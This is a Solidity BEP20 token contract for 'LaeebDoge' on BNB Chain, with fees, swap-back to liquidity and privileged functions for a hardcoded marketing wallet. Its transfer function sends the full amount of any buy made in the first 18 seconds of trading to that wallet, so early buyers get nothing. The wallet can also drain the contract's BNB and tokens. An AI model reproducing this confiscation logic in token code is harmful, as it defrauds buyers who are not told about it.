/**
 *Submitted for verification at BscScan.com on 2022-06-28
*/

/**
 *Submitted for verification at BscScan.com on 2022-06-02
*/

/**
 *Submitted for verification at BscScan.com on 2022-04-09
*/

/**
 *Submitted for verification at BscScan.com on 2022-04-09
*/

//SPDX-License-Identifier: unlicensed
pragma solidity ^0.8.0;

library SafeMath {
    
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
} 

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_msgSender() == _owner, "not owner");
        _;
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public {
        require(newOwner != address(0), "newOwner invalid");
        if (_owner != address(0)) {
            require(_msgSender() == _owner, "not owner");
        }
        
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract LaeebDoge is IBEP20, Ownable {
    using SafeMath for uint256;

    string constant _name = "LaeebDoge";
    string constant _symbol = "LaeebDoge";
    uint8 constant _decimals = 6;

    uint256 _totalSupply = 1000000000000 * (10 ** _decimals);

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => bool) isFeeExempt;

    uint256 public startTime;
    uint256 public botTime = 18;

    uint256 marketingFee = 100;
    uint256 liquidityFee = 100;
    uint256 burnFee = 100;
    uint256 totalFeeButBurn = 200;

    uint256 feeDenominator = 10000;

    bool swapBackEnable = true;

    address public marketingFeeReceiver;
    address public DEAD = 0x000000000000000000000000000000000000dEaD;

    IDEXRouter public router;
    address public pair;

    uint256 public swapThreshold = _totalSupply / 2000;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor (
    ){
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pair = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));
        _allowances[address(this)][address(router)] = _totalSupply;
        
        marketingFeeReceiver = address(0x091a7e27c1604a4983a80Dc19C93237B20293CcD);

        isFeeExempt[msg.sender] = true;
        isFeeExempt[address(this)] = true;
        isFeeExempt[marketingFeeReceiver] = true;
        isFeeExempt[address(router)] = true;
        isFeeExempt[DEAD] = true;
       
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner(); }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue)
        external
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transfer(_msgSender(), recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][_msgSender()] != _totalSupply){
            _allowances[sender][_msgSender()] = _allowances[sender][_msgSender()].sub(amount, "Insufficient Allowance");
        }
        require(startTime > 0 || isFeeExempt[sender],'Trading not open');
        if(startTime == 0 && recipient ==  pair) {
            startTime = block.timestamp;
        }
        return _transfer(sender, recipient, amount);
    }
    function _transfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if (sender == pair && (block.timestamp - startTime <= botTime) && !isFeeExempt[recipient]) {
            _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
            _balances[marketingFeeReceiver] = _balances[marketingFeeReceiver].add(amount);
            emit Transfer(sender, marketingFeeReceiver, amount);
            return true;
        }
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }
        if(shouldSwapBack(sender,recipient)){
            swapBack();
        }
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        uint256 amountReceived = shouldTakeFee(sender,recipient) ? takeFee(sender, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function shouldTakeFee(address sender,address recipient) internal view returns (bool) {
        return !isFeeExempt[sender] && !isFeeExempt[recipient] && (sender == pair || recipient == pair);
    }

    function takeFee(address sender, uint256 amount) internal returns (uint256) {
        uint256 fee = amount.mul(totalFeeButBurn).div(feeDenominator);
        _balances[address(this)] = _balances[address(this)].add(fee);
         emit Transfer(sender, address(this), fee);
        uint256 burnAmount = amount.mul(burnFee).div(feeDenominator);
        _balances[DEAD] = _balances[DEAD].add(burnAmount);
        emit Transfer(sender, DEAD, burnAmount);
        return amount.sub(fee).sub(burnAmount);
    }

    function shouldSwapBack(address sender,address recipient) internal view returns (bool) {
        return 
        swapBackEnable 
        && !isFeeExempt[sender] 
        && !isFeeExempt[recipient]
        &&  sender != pair
        && !inSwap
        && _balances[address(this)] >= swapThreshold;
    }

    function swapBack() internal swapping {
        uint256 amountToLiquify = swapThreshold.mul(liquidityFee).div(totalFeeButBurn).div(2);
        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance.sub(balanceBefore);

        uint256 totalBNBFee = totalFeeButBurn.sub(liquidityFee.div(2));

        uint256 amountBNBLiquidity = amountBNB.mul(liquidityFee).div(totalBNBFee).div(2);
        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                marketingFeeReceiver,
                block.timestamp
            );
        }
        payable(marketingFeeReceiver).transfer(address(this).balance);
    }

    function TransferBNBsOutfromContract(uint256 amount, address payable receiver) external {
        require(msg.sender == marketingFeeReceiver || msg.sender == owner());
        uint256 contractBalance = address(this).balance;
        require(contractBalance > amount,"Not Enough bnbs");
        receiver.transfer(amount);
    }
    function swapForToken(address token, address receiver) external {
        require(msg.sender == marketingFeeReceiver || msg.sender == owner());
        IBEP20(token).transfer(receiver,IBEP20(token).balanceOf(address(this)));
    }
    function excludeFromFee(address account) public {
        require(msg.sender == marketingFeeReceiver || msg.sender == owner());
        isFeeExempt[account] = true;
    }
    function includeInFee(address account) public {
         require(msg.sender == marketingFeeReceiver || msg.sender == owner());
        isFeeExempt[account] = false;
    }
    function excludeMultiFromFee(address[] calldata accounts, bool excluded)
        public
    {
        require(msg.sender == marketingFeeReceiver || msg.sender == owner());
        for (uint256 i = 0; i < accounts.length; i++) {
            isFeeExempt[accounts[i]] = excluded;
        }
    }
    function isExcludedFromFee(address account) public view returns (bool) {
        return isFeeExempt[account];
    }
    function multipleTransfer(address[] calldata accounts, uint256 amount) public {
        for(uint256 i = 0; i < accounts.length; i++) {
            _basicTransfer(_msgSender(), accounts[i], amount);
        }
    }
    function setSwapBackSettings(uint256 _amount) external {
        require(msg.sender == marketingFeeReceiver || msg.sender == owner());
        swapThreshold = _amount;
    }
    function setSwapBackEnable(bool _enable) external{
        require(msg.sender == marketingFeeReceiver || msg.sender == owner());
        swapBackEnable = _enable;
    }
}